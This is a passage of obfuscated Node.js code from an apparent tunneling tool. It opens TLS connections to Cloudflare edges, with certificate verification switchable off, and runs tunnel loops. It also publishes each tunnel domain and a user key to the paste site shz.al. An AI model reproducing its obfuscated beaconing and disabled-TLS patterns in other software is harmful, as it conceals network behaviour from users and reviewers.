                return c(d, f);
            },
            'NDwCt': function (c, d, f) {
                return c(d, f);
            },
            'ZsMjf': 'error',
            'gGwHL': ed(0x32a),
            'WygtM': function (c, d, f) {
                return c(d, f);
            },
            'pgeTZ': ed(0x8a6),
            'HCrrj': ed(0x28f),
            'bJmfp': function (c, d) {
                return c(d);
            }
        };
    return new Promise((c, d) => {
        const ef = ed, f = {
                'NTaZf': 'error',
                'mFYVv': function (n, o, p) {
                    const ee = a0b;
                    return b[ee(0x914)](n, o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            d(new Error(b[ef(0x878)]));
            return;
        }
        if (![
                b[ef(0x969)],
                ef(0x2e4)
            ][ef(0x94f)](g[ef(0x5cf)]) || !g[ef(0x987)]) {
            b['bJmfp'](d, new Error(b['pgeTZ']));
            return;
        }
        const h = g[ef(0x5cf)] === ef(0x2e4), i = g[ef(0x1f7)] || (h ? 0x1bb : 0x50), j = a0i[ef(0x79a)]({
                'host': g[ef(0x987)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const eg = ef;
                if (k)
                    return;
                k = !![], j[eg(0x533)](f['NTaZf'], m), j['setTimeout'](0x0), o(p);
            }, m = o => {
                const eh = ef;
                !k && f[eh(0x546)](l, d, o);
            };
        j['on'](b[ef(0x494)], m), j['setTimeout'](0x7530, () => j[ef(0x7f0)](new Error('origin\x20connection\x20timeout'))), j['on'](ef(0x79a), () => {
            const ej = ef, o = {
                    'DlLyL': function (q, r, s) {
                        const ei = a0b;
                        return b[ei(0x7db)](q, r, s);
                    }
                };
            if (!h) {
                b[ej(0x724)](l, c, j);
                return;
            }
            const p = a0j[ej(0x79a)]({
                'socket': j,
                'servername': g[ej(0x987)]
            });
            p['on'](b[ej(0x494)], q => {
                const ek = ej;
                !k && f[ek(0x546)](l, d, q);
            }), p['on'](b[ej(0x245)], () => {
                const el = ej;
                o[el(0x893)](l, c, p);
            });
        });
    });
}
function a0aB(a) {
    const em = a0aY, b = [];
    for (let c = 0x0; c < a[em(0x314)][em(0x7f5)]; c += 0x2) {
        b[em(0x39c)]([
            a[em(0x314)][c],
            a[em(0x314)][c + 0x1]
        ]);
    }
    return b;
}
function a0aC(a, b, c, d, f) {
    const en = a0aY, g = {
            'kNWrN': function (h, i) {
                return h(i);
            },
            'pFOhH': function (h, i) {
                return h(i);
            },
            'vBWxo': function (h, i) {
                return h(i);
            },
            'pCoqH': en(0x8a6),
            'RCxCt': en(0x28f),
            'QdPRp': en(0x2e4),
            'IzlXB': function (h, i) {
                return h === i;
            },
            'RSCCe': 'connection',
            'tTizE': function (h, i) {
                return h === i;
            },
            'qnWnG': 'transfer-encoding',
            'FKFST': function (h, i) {
                return h === i;
            },
            'ImHbU': en(0x3ba),
            'DofMp': en(0x7f6),
            'MXlaQ': en(0x772)
        };
    return new Promise((h, i) => {
        const eo = en;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[eo(0x7bb)](i, new Error(g[eo(0x7ff)]));
            return;
        }
        if (![
                g['RCxCt'],
                g[eo(0x6ca)]
            ][eo(0x94f)](j[eo(0x5cf)]) || !j[eo(0x987)]) {
            g['pFOhH'](i, new Error(g[eo(0x7ff)]));
            return;
        }
        const k = j[eo(0x5cf)] === g['QdPRp'], l = j[eo(0x1f7)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r[eo(0x216)]();
            if (t === eo(0x324) || g[eo(0x6a2)](t, g[eo(0x26b)]) || g[eo(0x71e)](t, g['qnWnG']) || g[eo(0x7b9)](t, g[eo(0x481)]))
                continue;
            m[r] = s;
        }
        m[g[eo(0x4c7)]] = j[eo(0x324)];
        f[eo(0x7f5)] && (m[g[eo(0x4d7)]] = g[eo(0x7bb)](String, f[eo(0x7f5)]));
        const n = c[eo(0x456)]('/') ? c : '/' + c, o = k ? a0h : a0g, p = o[eo(0x8b2)]({
                'hostname': j[eo(0x987)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const ep = eo;
                g[ep(0x50c)](h, {
                    'status': u['statusCode'],
                    'headers': g['pFOhH'](a0aB, u),
                    'body': u
                });
            });
        p['on'](eo(0x993), u => i(u)), p['end'](f[eo(0x7f5)] ? f : undefined);
    });
}
function a0aD(a) {
    const eq = a0aY, b = {
            'dEUbk': eq(0x37d),
            'fptWO': eq(0x53f),
            'mOgBy': eq(0x661),
            'dgPQd': function (c, d) {
                return c(d);
            },
            'Voqja': function (c, d) {
                return c < d;
            },
            'kPTTU': eq(0x2db),
            'QUHwD': function (c, d, f) {
                return c(d, f);
            },
            'CiRJc': function (c, d) {
                return c + d;
            },
            'WTHLC': function (c) {
                return c();
            },
            'YWYmO': 'origin\x20closed\x20before\x20response\x20headers'
        };
    return new Promise((c, d) => {
        const et = eq, f = {
                'mhYhw': function (l, m) {
                    return b['Voqja'](l, m);
                },
                'FIKaY': b['kPTTU'],
                'ZHXcR': function (l, m, n) {
                    return b['QUHwD'](l, m, n);
                },
                'VFbCF': 'malformed\x20HTTP/1.1\x20response\x20status',
                'XAzPy': function (l, m) {
                    const er = a0b;
                    return b[er(0x31a)](l, m);
                },
                'pzkkh': function (l, m) {
                    return l(m);
                },
                'hltGA': function (l, m) {
                    return b['CiRJc'](l, m);
                },
                'XzKgB': function (l) {
                    const es = a0b;
                    return b[es(0x559)](l);
                },
                'OHyiT': b['YWYmO']
            };
        let g = Buffer[et(0x21a)](0x0);
        const h = () => {
                const eu = et;
                a[eu(0x533)](b['dEUbk'], i), a[eu(0x533)]('error', j), a[eu(0x533)](b[eu(0x975)], k), a[eu(0x533)](b[eu(0x7de)], k);
            }, i = l => {
                const ev = et;
                g = g[ev(0x7f5)] ? Buffer[ev(0x8ed)]([
                    g,
                    l
                ]) : l;
                const m = g[ev(0x807)]('\x0d\x0a\x0d\x0a');
                if (f[ev(0x31b)](m, 0x0))
                    return;
                h();
                const n = g[ev(0x23d)](0x0, m)['toString'](f[ev(0x4d5)]), o = n[ev(0x946)]('\x0d\x0a'), p = o[0x0][ev(0x946)]('\x20'), q = f['ZHXcR'](parseInt, p[0x1], 0xa);
                if (!Number[ev(0x2ef)](q)) {
                    d(new Error(f[ev(0x463)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; f[ev(0x31b)](s, o['length']); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t['indexOf'](':');
                    u > 0x0 && r[ev(0x39c)]([
                        t[ev(0x710)](0x0, u)[ev(0x7b0)](),
                        t[ev(0x710)](f[ev(0x21f)](u, 0x1))[ev(0x7b0)]()
                    ]);
                }
                f['pzkkh'](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[ev(0x23d)](f[ev(0x69f)](m, 0x4))
                });
            }, j = l => {
                const ew = et;
                h(), b[ew(0x490)](d, l);
            }, k = () => {
                const ex = et;
                f[ex(0x43f)](h), d(new Error(f[ex(0x4fa)]));
            };
        a['on'](b[et(0x93c)], i), a['on'](et(0x993), j), a['on'](b[et(0x975)], k), a['on'](b[et(0x7de)], k);
    });
}
function a0aE(a) {
    const ey = a0aY, b = {
            'WBdyE': 'h2.cftunnel.com',
            'IRJBA': function (f, g) {
                return f === g;
            },
            'HtcDw': 'cftunnel.com',
            'tMvrz': ey(0x353),
            'AHzeS': function (f, g) {
                return f !== g;
            },
            'Scqfh': function (f, g) {
                return f + g;
            },
            'WhYmq': function (f, g) {
                return f(g);
            },
            'rQTck': 'CloudFlare\x20Origin\x20SSL',
            'xNZEh': ey(0x92e),
            'WGkVC': ey(0x7e2),
            'RrVqY': ey(0x75f)
        };
    if (!a || !a[ey(0x635)])
        return b[ey(0x748)];
    if (b[ey(0x381)](a[ey(0x635)]['O'], ey(0x855)))
        return b[ey(0x213)]('issuer\x20O\x20mismatch:\x20', a['issuer']['O'] || '');
    if (!b[ey(0x8a8)](String, a[ey(0x635)]['OU'] || '')[ey(0x456)](b[ey(0x347)]))
        return b[ey(0x213)](b['xNZEh'], a[ey(0x635)]['OU'] || '');
    if (!a[ey(0x1e4)] || b['AHzeS'](a[ey(0x1e4)]['CN'], ey(0x990)))
        return b[ey(0x87b)];
    const c = String(a[ey(0x5f3)] || '')[ey(0x946)](',')[ey(0x499)](f => f['trim']()[ey(0x216)]()), d = c[ey(0x85a)](f => {
            const ez = ey;
            if (!f[ez(0x456)]('dns:'))
                return ![];
            const g = f[ez(0x710)](0x4);
            return g === b[ez(0x713)] || b['IRJBA'](g, b[ez(0x4e3)]) || g['startsWith']('*.') && b['WBdyE'][ez(0x5a6)](g[ez(0x710)](0x1));
        });
    if (!d)
        return b[ey(0x997)];
    return null;
}
function a0aF(a, b) {
    const eA = a0aY, c = {
            'dAYHY': function (h, i) {
                return h(i);
            },
            'WUixt': function (h, i) {
                return h + i;
            },
            'kKAip': eA(0x1ff),
            'uquhH': eA(0x637),
            'GrNWg': 'edge\x20',
            'TtQde': eA(0x474),
            'JtGRi': function (h, i) {
                return h + i;
            },
            'uDUbn': 'all\x20Cloudflare\x20edges\x20failed:\x20'
        }, d = a0a2['slice']()['sort'](() => Math[eA(0x4f6)]() - 0.5);
    let f = null;
    const g = async () => {
        const eC = eA, h = {
                'wbFZo': function (i, j) {
                    const eB = a0b;
                    return c[eB(0x2d0)](i, j);
                },
                'mzdgP': 'edge\x20certificate\x20verification\x20failed:\x20',
                'ZiXGR': function (i, j) {
                    return c['WUixt'](i, j);
                },
                'UIYOI': c[eC(0x67e)],
                'vfPqO': c[eC(0x747)],
                'XKdsq': eC(0x993),
                'mpAet': eC(0x32a)
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const eE = eC, l = {
                            'DQNjW': function (n, o) {
                                const eD = a0b;
                                return h[eD(0x3ac)](n, o);
                            },
                            'GgTDs': h['mzdgP'],
                            'haVEj': function (n, o) {
                                return n !== o;
                            },
                            'ienhE': eE(0x813),
                            'GURed': function (n, o) {
                                return n > o;
                            },
                            'cOKDZ': function (n, o) {
                                return n + o;
                            },
                            'brzzr': function (n, o) {
                                return h['ZiXGR'](n, o);
                            },
                            'WXkcJ': h[eE(0x80b)],
                            'XfeGs': function (n, o) {
                                return h['wbFZo'](n, o);
                            }
                        }, m = a0j[eE(0x79a)]({
                            'host': i,
                            'port': a0a3,
                            'ALPNProtocols': ['h2'],
                            'servername': h[eE(0x50e)],
                            'rejectUnauthorized': ![]
                        });
                    m[eE(0x691)](0x2710, () => m[eE(0x7f0)](new Error(eE(0x53b)))), m['on'](h[eE(0x1ed)], k), m['on'](h[eE(0x493)], () => {
                        const eF = eE;
                        if (a) {
                            const o = l[eF(0x7f8)](a0aE, m[eF(0x79b)](![]));
                            if (o) {
                                m[eF(0x7f0)](new Error(l[eF(0x437)] + o));
                                return;
                            }
                        }
                        const n = m[eF(0x607)];
                        if (n && l[eF(0x55e)](n, 'h2')) {
                            m[eF(0x7f0)](new Error(l['ienhE']));
                            return;
                        }
                        l[eF(0x933)](a0aK, 0x0) ? m[eF(0x691)](a0aK, () => m['destroy'](new Error(eF(0x961)))) : m[eF(0x691)](0x0), b[eF(0x8e1)](l[eF(0x354)](l['cOKDZ'](l[eF(0x917)](l['WXkcJ'], i), ':'), a0a3)), l['XfeGs'](j, m);
                    });
                });
            } catch (j) {
                f = j, b[eC(0x5c4)](c[eC(0x484)](c[eC(0x4ce)] + i, c['TtQde']) + j);
            }
        }
        throw new Error(c[eC(0x241)](c['uDUbn'], f));
    };
    return g();
}
const a0aG = 0x2;
function a0aH(a, b, c) {
    const eG = a0aY, d = {
            'WZQRA': function (g, h, i) {
                return g(h, i);
            },
            'DYVUq': function (g, h) {
                return g < h;
            }
        }, f = d[eG(0x872)](parseInt, process.env[a] || '', 0xa);
    if (!Number[eG(0x2ef)](f) || d[eG(0x40c)](f, c))
        return b;
    return f;
}
const a0aI = a0aH(a0aY(0x43b), 0x5, 0x2), a0aJ = 0x1e, a0aK = ((() => {
        const eH = a0aY, a = {
                'kLVSM': function (c, d) {
                    return c * d;
                }
            }, b = parseInt(process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[eH(0x2ef)](b) || b < 0x0)
            return a[eH(0x629)](0x12c, 0x3e8);
        return b === 0x0 ? 0x0 : Math[eH(0x253)](b, 0xa) * 0x3e8;
    })());
function a0aL(a) {
    const eI = a0aY, b = {
            'cShCP': function (c, d) {
                return c === d;
            },
            'ujXps': eI(0x709),
            'jdevu': eI(0x58d)
        };
    if (b['cShCP'](typeof a, b['ujXps'])) {
        const c = a[eI(0x7b0)]();
        if (c)
            try {
                return JSON[eI(0x57a)](c);
            } catch (d) {
            }
        return {};
    }
    return a && typeof a === b[eI(0x584)] ? a : {};
}
class a0aM {
    constructor(a) {
        const eJ = a0aY;
        this[eJ(0x25b)] = a, this[eJ(0x88d)] = new Map(), this[eJ(0x940)] = null;
    }
    async [a0aY(0x8bf)](a, b) {
        const eK = a0aY, c = {
                'TdUAM': function (l, m) {
                    return l(m);
                },
                'ulcjH': eK(0x84b),
                'rBGXG': 'failed\x20to\x20create\x20tunnel:\x20',
                'pdLTP': eK(0x450),
                'gjTut': function (l, m) {
                    return l + m;
                },
                'myaRj': function (l, m) {
                    return l + m;
                },
                'PsRyL': eK(0x543),
                'wTYBu': eK(0x67d)
            }, d = this['tunnels'][eK(0x47b)](a) || [];
        if (d[eK(0x7f5)] > 0x0 && !b) {
            const l = new Error(eK(0x6b6) + a + eK(0x841));
            l[eK(0x62d)] = 0x199, l['port'] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c['TdUAM'](a0au, c['ulcjH']);
        } catch (m) {
            const n = new Error(c['rBGXG'] + m[eK(0x842)]);
            n[eK(0x62d)] = 0x1f4, n[eK(0x1f7)] = a;
            throw n;
        }
        const j = f[eK(0x456)](c[eK(0x2a6)]) ? f : c[eK(0x7e5)](eK(0x450), f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()['toISOString']()[eK(0x773)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[eK(0x857)] = this['_runLoop'](k, g, h, i)[eK(0x7a8)](o => this[eK(0x25b)][eK(0x5c4)](eK(0x639) + j + eK(0x8cd) + o['message'])), d[eK(0x39c)](k), this[eK(0x88d)][eK(0x336)](a, d), this['log'][eK(0x8e1)](c['gjTut'](c[eK(0x880)](c[eK(0x4ff)] + j, c[eK(0x7ad)]), a)), k;
    }
    [a0aY(0x4a8)]() {
        const eL = a0aY, a = [], b = [...this[eL(0x88d)]['keys']()][eL(0x741)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels']['get'](c)) {
                a['push']({
                    'tunnel_domain': d[eL(0x707)],
                    'port': d['port'],
                    'created_at': d[eL(0x6c6)]
                });
            }
        }
        return a;
    }
    async [a0aY(0x614)](a, b) {
        const eM = a0aY, c = {
                'ZlYuB': function (i, j) {
                    return i === j;
                },
                'TEiyk': function (i, j) {
                    return i === j;
                },
                'ECUGZ': function (i, j) {
                    return i > j;
                },
                'fIDfv': function (i, j) {
                    return i !== j;
                },
                'jLSwF': function (i, j) {
                    return i + j;
                },
                'tNANa': eM(0x4fc)
            }, d = this[eM(0x88d)][eM(0x47b)](a) || [];
        if (c['ZlYuB'](d[eM(0x7f5)], 0x0))
            return {
                'status': 0x194,
                'message': eM(0x652) + a
            };
        let f;
        if (c[eM(0x88c)](b, undefined) || b === null || b === '') {
            if (c[eM(0x731)](d[eM(0x7f5)], 0x1))
                return {
                    'status': 0x199,
                    'message': eM(0x936) + a + eM(0x925)
                };
            f = d;
        } else {
            f = d[eM(0x4b3)](i => i[eM(0x707)] === b);
            if (c[eM(0x7fc)](f[eM(0x7f5)], 0x0))
                return {
                    'status': 0x194,
                    'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a + eM(0x2df) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[eM(0x6f6)] = !![];
            if (c[eM(0x850)](i[eM(0x5b7)], null))
                try {
                    i[eM(0x5b7)][eM(0x7f0)]();
                } catch (j) {
                }
            await i[eM(0x857)]['catch'](() => {
            }), g['push']({
                'tunnel_domain': i[eM(0x707)],
                'port': i[eM(0x1f7)],
                'created_at': i[eM(0x6c6)]
            });
        }
        const h = d[eM(0x4b3)](k => !k[eM(0x6f6)]);
        c['ECUGZ'](h[eM(0x7f5)], 0x0) ? this[eM(0x88d)]['set'](a, h) : this[eM(0x88d)][eM(0x775)](a);
        for (const k of g) {
            this[eM(0x25b)][eM(0x8e1)](c[eM(0x989)](c[eM(0x5de)], k['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g[eM(0x7f5)],
            'tunnels': g
        };
    }
    async [a0aY(0x8a9)](a, b, c, d) {
        const eN = a0aY, f = {
                'FKtLR': function (k, l) {
                    return k < l;
                },
                'lReFK': function (k, l) {
                    return k + l;
                },
                'CjzFo': eN(0x4c4),
                'iJOTq': function (k, l) {
                    return k !== l;
                },
                'JvKTQ': function (k, l) {
                    return k(l);
                },
                'ukHPx': 'true',
                'nBTHw': function (k, l) {
                    return k % l;
                },
                'rKgfs': function (k, l) {
                    return k + l;
                },
                'enCvx': function (k, l) {
                    return k !== l;
                },
                'HIXMl': function (k, l) {
                    return k * l;
                },
                'MQauU': function (k, l) {
                    return k * l;
                }
            }, g = f[eN(0x734)](f['CjzFo'], a['port']), h = async k => {
                const eO = eN;
                for (let l = 0x0; f['FKtLR'](l, k) && !a[eO(0x6f6)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[eO(0x29a)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a['stopped']) {
            let k = null, l = null;
            try {
                const m = f[eN(0x973)](f[eN(0x7be)](String, process.env.KISAMA_EDGE_INSECURE || '')[eN(0x216)](), f[eN(0x382)]);
                k = await a0aF(m, this['log']);
                if (a[eN(0x6f6)]) {
                    try {
                        k[eN(0x7f0)]();
                    } catch (n) {
                    }
                    break;
                }
                a[eN(0x5b7)] = k, j = f[eN(0x7fb)](f[eN(0x734)](j, 0x1), 0x4), l = new a0ax(k, g, b, c, d, j, this[eN(0x25b)], a['tunnelDomain'], ![], { 'printed': !![] }), await l[eN(0x5c9)]();
            } catch (o) {
                !a[eN(0x6f6)] && this[eN(0x25b)][eN(0x5c4)](f[eN(0x612)](f[eN(0x612)](f[eN(0x734)](eN(0x359), a[eN(0x707)]), eN(0x3ab)), o[eN(0x842)]));
            } finally {
                if (f[eN(0x973)](k, null))
                    try {
                        k[eN(0x7f0)]();
                    } catch (p) {
                    }
                a[eN(0x5b7)] = null;
            }
            if (a[eN(0x6f6)])
                break;
            f['enCvx'](l, null) && l[eN(0x606)] ? i = 0x0 : (i += 0x1, i >= a0aI && (await this[eN(0x2a1)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await f[eN(0x7be)](h, f['HIXMl'](a0aJ, 0x3e8)))), !a[eN(0x6f6)] && await f['JvKTQ'](h, f[eN(0x867)](a0aG, 0x3e8));
        }
    }
    [a0aY(0x2a1)](a, b) {
        const eP = a0aY, c = {
                'oDMlQ': eP(0x450),
                'IDhMm': function (f, g) {
                    return f + g;
                },
                'dyqbe': 'argo\x20tunnel\x20domain\x20changed:\x20',
                'gNiFt': eP(0x4f5),
                'aMFeS': function (f, g) {
                    return f === g;
                },
                'zkhoX': eP(0x71f),
                'hEeBM': eP(0x2c8),
                'MUYWW': function (f, g) {
                    return f(g);
                },
                'DcxUV': eP(0x84b)
            }, d = this[eP(0x3bb)] || a0au;
        return c['MUYWW'](d, c[eP(0x566)])['then'](([f, g, h, i]) => {
            const eQ = eP, j = a[eQ(0x707)];
            b(g, h, i), a['tunnelDomain'] = f['startsWith']('https://') ? f : c[eQ(0x782)] + f, this[eQ(0x25b)][eQ(0x5c4)](c[eQ(0x839)](c[eQ(0x839)](c[eQ(0x3ef)], j) + c[eQ(0x71d)], a[eQ(0x707)]));
            if (c[eQ(0x918)](typeof this['onDomainChange'], c[eQ(0x29b)]))
                try {
                    this[eQ(0x940)](j, a[eQ(0x707)]);
                } catch (k) {
                }
            return !![];
        })['catch'](f => {
            const eR = eP;
            return this[eR(0x25b)]['warning'](c['IDhMm'](c[eR(0x8b6)], f['message'])), ![];
        });
    }
}
class a0aN {
    static [a0aY(0x4a1)] = ![];
    static [a0aY(0x6dc)] = null;
    static ['_SHZAL_NAME_CHARS'] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static ['_SHZAL_KEY_HINT_SHOWN'] = ![];
    static [a0aY(0x51b)]() {
        const eS = a0aY, a = {
                'Mjbvu': function (g, h) {
                    return g < h;
                },
                'JrmzO': eS(0x5ba),
                'GeNmY': function (g, h) {
                    return g < h;
                },
                'aYkgU': eS(0x38c),
                'HUgWT': eS(0x22f),
                'xQskX': function (g, h) {
                    return g || h;
                },
                'eXQZq': '(未设置)',
                'joaYK': eS(0x281),
                'GUqOu': eS(0x56c)
            }, b = a0P[eS(0x22f)] || '', c = a0P[eS(0x38c)] || a0P[eS(0x22f)] || '', d = [];
        if (a[eS(0x8d8)](b[eS(0x7f5)], 0x3))
            d[eS(0x39c)]('KNAME\x20过短\x20(' + b[eS(0x7f5)] + eS(0x8d9));
        if (!this[eS(0x98f)][eS(0x4ef)](b))
            d[eS(0x39c)](a['JrmzO']);
        if (a['GeNmY'](c['length'], 0x8))
            d[eS(0x39c)](eS(0x624) + c[eS(0x7f5)] + eS(0x6ee) + (a0P[eS(0x38c)] ? a[eS(0x46a)] : a[eS(0x712)]) + ')');
        const f = d[eS(0x7f5)] === 0x0;
        return !f && !this[eS(0x1e2)] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0D[eS(0x8e1)](eS(0x982) + d[eS(0x265)](';\x20') + '\x20(KNAME=' + a[eS(0x2fe)](b, a[eS(0x72c)]) + ',\x20KNAME_KEY=' + (a0P[eS(0x38c)] || a[eS(0x61c)]) + ')'), a0D[eS(0x8e1)](a[eS(0x3a4)])), f;
    }
    static [a0aY(0x6b8)]() {
        const eT = a0aY, a = {
                'hSHmG': function (b, c) {
                    return b(c);
                },
                'iNvBe': 'true'
            };
        return a0P[eT(0x2bb)] || a[eT(0x587)](String, process.env.SHZAL_DEBUG || '')[eT(0x216)]() === a['iNvBe'];
    }
    static ['reportShzal'](a) {
        const eU = a0aY, b = {
                'rSubr': function (f, g) {
                    return f + g;
                },
                'TvlVw': eU(0x5f6),
                'KjrRW': 'end',
                'ufrtd': eU(0x2e3),
                'yTwgN': eU(0x993),
                'fbAwj': function (f, g) {
                    return f(g);
                },
                'NcsIO': function (f, g) {
                    return f === g;
                },
                'GANMc': function (f, g) {
                    return f(g);
                },
                'UxSJK': eU(0x7b6),
                'svEav': '----kisama',
                'fpJEf': eU(0x4d4),
                'ccsPU': eU(0x506),
                'EEsLu': eU(0x576),
                'ZzFiM': function (f, g) {
                    return f > g;
                },
                'iFKkZ': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'VIkdc': eU(0x75c),
                'KScPg': function (f, g) {
                    return f + g;
                },
                'bbiGf': eU(0x6b0)
            }, c = this[eU(0x6b8)](), d = f => {
                const eV = eU;
                if (c)
                    a0D[eV(0x761)](b[eV(0x561)](b['TvlVw'], f));
            };
        return new Promise(f => {
            const eW = eU, g = {
                    'RrWVm': b[eW(0x853)],
                    'XfQPs': function (n, o) {
                        return b['rSubr'](n, o);
                    },
                    'SwdPc': b['ufrtd'],
                    'OYbCS': b[eW(0x2b7)],
                    'aDHOZ': function (n, o) {
                        const eX = eW;
                        return b[eX(0x77d)](n, o);
                    },
                    'BuYKf': eW(0x1f8),
                    'ukyLA': function (n, o) {
                        const eY = eW;
                        return b[eY(0x561)](n, o);
                    },
                    'mROUb': function (n, o) {
                        const eZ = eW;
                        return b[eZ(0x630)](n, o);
                    },
                    'ZioGF': function (n, o, p, q, r) {
                        return n(o, p, q, r);
                    },
                    'emtmv': function (n, o) {
                        const f0 = eW;
                        return b[f0(0x6ed)](n, o);
                    },
                    'BHeOg': b['UxSJK'],
                    'CFLHq': function (n, o) {
                        return n(o);
                    }
                }, h = a0P[eW(0x22f)], i = a0P[eW(0x38c)] || a0P[eW(0x22f)], j = b[eW(0x7e9)] + a0k[eW(0x489)](0xc)[eW(0x248)](b['fpJEf']), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const f1 = eW, o = n[f1(0x499)](([p, q]) => Buffer[f1(0x4ed)]('--' + j + f1(0x6da) + p + f1(0x91c) + q + '\x0d\x0a'));
                    return o[f1(0x39c)](Buffer['from']('--' + j + f1(0x98d))), Buffer[f1(0x8ed)](o);
                }, m = (n, o, p, q) => {
                    const f3 = eW, r = {
                            'fEVCL': function (v, w) {
                                return v(w);
                            },
                            'DPLUu': function (v, w) {
                                const f2 = a0b;
                                return g[f2(0x351)](v, w);
                            },
                            'xHFon': function (v, w) {
                                return v + w;
                            },
                            'WJYwX': f3(0x50b)
                        }, s = new URL(n), t = a0h['request']({
                            'hostname': s[f3(0x987)],
                            'port': s['port'] || 0x1bb,
                            'path': g[f3(0x351)](s[f3(0x728)], s[f3(0x52d)]),
                            'method': p,
                            'headers': {
                                'Content-Type': f3(0x740) + j,
                                'Content-Length': o ? o['length'] : 0x0,
                                'User-Agent': g[f3(0x828)]
                            }
                        }, v => {
                            const f4 = f3;
                            v[f4(0x61d)](), v['on'](g['RrWVm'], () => q(v[f4(0x5cd)]));
                        });
                    t['on'](g['OYbCS'], v => {
                        const f5 = f3;
                        r[f5(0x4cb)](d, r[f5(0x517)](r[f5(0x8f0)](p, '\x20'), n) + r[f5(0x455)] + v[f5(0x842)]), q(0x0);
                    }), t['setTimeout'](0x7530, () => t[f3(0x7f0)](new Error('shz.al\x20request\x20timeout')));
                    if (o)
                        t['write'](o);
                    t[f3(0x53f)]();
                };
            b[eW(0x6ed)](d, b[eW(0x561)](b['rSubr'](b[eW(0x561)](b[eW(0x7d9)], h), b[eW(0x5ce)]), b[eW(0x2e8)](i[eW(0x7f5)], 0x0)) + ')');
            try {
                b[eW(0x556)](m, b[eW(0x96c)], b['fbAwj'](l, k), eW(0x920), n => {
                    const f7 = eW, o = {
                            'VQajD': function (p, q) {
                                const f6 = a0b;
                                return g[f6(0x732)](p, q);
                            },
                            'VkvgO': function (p, q) {
                                return p + q;
                            },
                            'dQkcv': f7(0x90a),
                            'KzTfN': function (p, q) {
                                return p === q;
                            },
                            'VwMNl': g[f7(0x2e1)]
                        };
                    d(g[f7(0x49e)]('POST\x20https://shz.al/\x20状态:\x20', n));
                    if (g[f7(0x7bd)](n, 0x199)) {
                        g[f7(0x732)](d, f7(0x7fe) + h + ':*');
                        const p = k[f7(0x4b3)](([q]) => q !== 'n');
                        g[f7(0x693)](m, 'https://shz.al/~' + h + ':' + i, g[f7(0x445)](l, p), 'PUT', q => {
                            const f8 = f7;
                            o[f8(0x249)](d, o[f8(0x2f3)](o[f8(0x5e8)], q) + (o[f8(0x5e4)](q, 0xc8) ? f8(0x33c) : o['VwMNl'])), f(q === 0xc8);
                        });
                    } else
                        n === 0xc8 ? (d(g['BHeOg']), g[f7(0x8b9)](f, !![])) : (g['aDHOZ'](d, g[f7(0x49e)](f7(0x573) + n, ')')), f(![]));
                });
            } catch (n) {
                b[eW(0x77d)](d, b[eW(0x5c6)](b['bbiGf'], n[eW(0x842)])), b['fbAwj'](f, ![]);
            }
        })[eU(0x68b)](f => {
            const f9 = eU;
            if (f)
                this[f9(0x6dc)] = a;
            return f;
        })[eU(0x7a8)](() => ![]);
    }
    static async ['reportDomainChange'](a) {
        const fa = a0aY, b = {
                'oDsbN': function (c, d) {
                    return c <= d;
                },
                'GAYcN': function (c, d) {
                    return c < d;
                }
            };
        for (let c = 0x1; b[fa(0x2b0)](c, 0x3); c++) {
            if (await this['reportShzal'](a))
                return;
            b[fa(0x4f1)](c, 0x3) && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0aY(0x452)]() {
        const fb = a0aY, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l['existsSync'](b) && a0l[fb(0x53c)](b)[fb(0x6ae)]())
                return b;
        }
        try {
            return a0p['homedir']();
        } catch (c) {
            return process[fb(0x376)]();
        }
    }
    static [a0aY(0x40e)]() {
        const fc = a0aY, a = {
                'TnLDP': 'domain.txt',
                'tSOnk': '$HOME'
            };
        let b = (a0P[fc(0x25f)] || '')[fc(0x7b0)]();
        if (!b)
            return a0o[fc(0x265)](this[fc(0x452)](), a['TnLDP']);
        if (b['startsWith'](a[fc(0x541)]))
            b = b[fc(0x7f5)] > 0x5 ? a0o[fc(0x265)](this['homeDir'](), b[fc(0x710)](0x5)[fc(0x773)](/^[/\\]+/, '')) : this[fc(0x452)]();
        else
            b[fc(0x456)]('~') && (b = a0o[fc(0x334)](b[fc(0x773)](/^~(?=[/\\]|$)/, this[fc(0x452)]())));
        return b;
    }
    static ['writeDomainFile'](a) {
        const fd = a0aY;
        this['_domain'] = a;
        const b = this[fd(0x40e)]();
        try {
            a0l['mkdirSync'](a0o['dirname'](a0o[fd(0x334)](b)), { 'recursive': !![] }), a0l[fd(0x540)](b, a), a0D['info'](fd(0x698) + b);
        } catch (c) {
            a0D[fd(0x89f)](fd(0x4b9) + b + '):\x20' + c[fd(0x842)]);
        }
    }
    static [a0aY(0x2f1)]() {
        const fe = a0aY, a = this[fe(0x40e)]();
        try {
